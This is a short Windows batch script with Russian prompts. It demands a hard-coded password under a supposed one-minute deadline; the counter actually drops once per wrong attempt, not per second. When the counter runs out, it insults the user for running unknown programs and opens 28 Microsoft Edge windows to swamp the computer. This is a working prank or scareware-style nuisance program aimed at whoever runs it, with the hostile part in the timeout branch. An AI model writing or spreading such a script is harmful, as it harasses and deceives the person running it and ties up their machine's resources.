@echo off
setlocal enabledelayedexpansion

set "password=149388608085675435"
set "input="
set /a countdown=60

echo У вас есть 1 минута на ввод пароля.

:input_loop
set /p "input=Введите пароль: "
if "!input!"=="%password%" (
    echo Пароль правильный. Программа завершает работу.
    exit /b
)

set /a countdown-=1
if !countdown! leq 0 (
    echo Время вышло, долбоёб! Не надо было запускать левые проги на Комп! Твой компьютер умрёт от большого количества окон Microsoft Edge! Жди!
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    start microsoftedge.exe
    exit /b
)
goto input_loop
